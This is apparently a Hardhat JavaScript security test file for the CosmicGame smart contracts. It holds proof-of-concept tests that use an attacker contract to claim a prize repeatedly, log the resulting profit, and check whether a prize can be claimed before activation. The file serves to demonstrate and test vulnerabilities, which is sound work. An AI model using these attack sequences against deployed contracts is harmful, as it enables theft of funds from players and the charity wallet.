const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");

describe("Security", function () {
  async function deployCosmic() {
    const [owner, otherAccount] = await ethers.getSigners();

    const CosmicGame = await ethers.getContractFactory("CosmicGame");
    const cosmicGame = await CosmicGame.deploy();

    const CosmicToken = await ethers.getContractFactory("CosmicToken");
    const cosmicToken = await CosmicToken.deploy();
    cosmicToken.transferOwnership(cosmicGame.address);

    const CosmicSignature = await ethers.getContractFactory("CosmicSignature");
    const cosmicSignature = await CosmicSignature.deploy(cosmicGame.address);

    const CosmicDAO = await ethers.getContractFactory("CosmicDAO");
    const cosmicDAO = await CosmicDAO.deploy(cosmicToken.address);

    const CharityWallet = await ethers.getContractFactory("CharityWallet");
    const charityWallet = await CharityWallet.deploy();
    await charityWallet.transferOwnership(cosmicDAO.address);

    const RandomWalkNFT = await ethers.getContractFactory("RandomWalkNFT");
    const randomWalkNFT = await RandomWalkNFT.deploy();

    await cosmicGame.setTokenContract(cosmicToken.address);
    await cosmicGame.setNftContract(cosmicSignature.address);
    await cosmicGame.setCharity(charityWallet.address);
    await cosmicGame.setRandomWalk(randomWalkNFT.address);
    await cosmicGame.setActivationTime(0);

    return {cosmicGame, cosmicToken, cosmicSignature, charityWallet, cosmicDAO, randomWalkNFT};
}

    it("Vulnerability to claimPrize() multiple times", async function () {

    const CosmicGame = await hre.ethers.getContractFactory("CosmicGame");
    const cosmicGame = await CosmicGame.deploy();
    await cosmicGame.deployed();

    const CosmicToken = await hre.ethers.getContractFactory("CosmicToken");
    const cosmicToken = await CosmicToken.deploy();
    cosmicToken.deployed();
    await cosmicToken.transferOwnership(cosmicGame.address);

    const CosmicSignature = await hre.ethers.getContractFactory("CosmicSignature");
    const cosmicSignature = await CosmicSignature.deploy(cosmicGame.address);
    cosmicSignature.deployed();

    const CosmicDAO = await hre.ethers.getContractFactory("CosmicDAO");
    const cosmicDAO = await CosmicDAO.deploy(cosmicToken.address);
    await cosmicDAO.deployed();

    const CharityWallet = await hre.ethers.getContractFactory("CharityWallet");
    const charityWallet = await CharityWallet.deploy();
    charityWallet.deployed();
    await charityWallet.transferOwnership(cosmicDAO.address);

    const RaffleWallet = await hre.ethers.getContractFactory("RaffleWallet");
    const raffleWallet = await RaffleWallet.deploy();
    raffleWallet.deployed();

    const RandomWalkNFT = await hre.ethers.getContractFactory("RandomWalkNFT");
    const randomWalkNFT = await RandomWalkNFT.deploy();
    randomWalkNFT.deployed();
  
    const RandomWalkNFT2 = await hre.ethers.getContractFactory("RandomWalkNFT");
    const randomWalkNFT2 = await RandomWalkNFT2.deploy();
    randomWalkNFT2.deployed();

    await cosmicGame.setTokenContract(cosmicToken.address);
    await cosmicGame.setNftContract(cosmicSignature.address);
    await cosmicGame.setCharity(charityWallet.address);
    await cosmicGame.setRaffleWallet(raffleWallet.address);
    await cosmicGame.setRandomWalk(randomWalkNFT.address);
	await cosmicGame.setActivationTime(0);
	let prizePercentage = "44";
	await cosmicGame.updatePrizePercentage(ethers.BigNumber.from(prizePercentage));

    const ReClaim = await ethers.getContractFactory("ReClaim");
    const reclaim = await ReClaim.deploy(cosmicGame.address);


    let donationAmount = hre.ethers.utils.parseEther('10');
    await cosmicGame.donate({value: donationAmount});

    [owner, addr1, addr2, addr3, ...addrs] = await ethers.getSigners();

    let bidPrice = await cosmicGame.getBidPrice();
    await cosmicGame.connect(addr3).bid("", {value: bidPrice}); // this works
    let prizeTime = await cosmicGame.timeUntilPrize();
    await ethers.provider.send("evm_increaseTime", [prizeTime.add(10800).toNumber()]);
    await ethers.provider.send("evm_mine");

    let prizeAmount = await cosmicGame.prizeAmount();
	console.log("Note: only works for prizePercentage <= "+prizePercentage);
    console.log("initial prizeAmount="+prizeAmount);
    let reclaim_bal_before = await ethers.provider.getBalance(reclaim.address);
    await reclaim.connect(addr3).claim_and_reset(ethers.BigNumber.from("1"));
    let reclaim_bal_after =  await ethers.provider.getBalance(reclaim.address);
    console.log("Attacker's contract balance before: "+reclaim_bal_before);
    console.log("Attacker's contract balance after:  "+reclaim_bal_after);
	let profit_from_vulnerability = reclaim_bal_after.sub(prizeAmount);
	console.log("Profit from vulnerability: "+profit_from_vulnerability);
  });
  it("Is possible to take prize before activation", async function () {
      const {cosmicGame, cosmicToken, cosmicSignature, charityWallet, cosmicDAO, randomWalkNFT} = await loadFixture(deployCosmic);
      let donationAmount = ethers.utils.parseEther('10');
      await cosmicGame.donate({value: donationAmount});
	  console.log("Donation amount is "+donationAmount);
	  await ethers.provider.send("evm_mine"); // begin
	  prizeTime = await cosmicGame.timeUntilPrize();
	  await ethers.provider.send("evm_increaseTime", [prizeTime.add(1).toNumber()]);
	  await ethers.provider.send("evm_mine");
	  let prizeAmount = await cosmicGame.prizeAmount();
	  console.log("prizeAmount is     "+prizeAmount);
	  let balance_before =(await addr3.getBalance());
	  console.log("Account balance before: "+ balance_before);
	  await cosmicGame.connect(addr3).claimPrize();
	  let balance_after = (await addr3.getBalance());
	  console.log("Account balance  after: "+balance_after);
  });
})
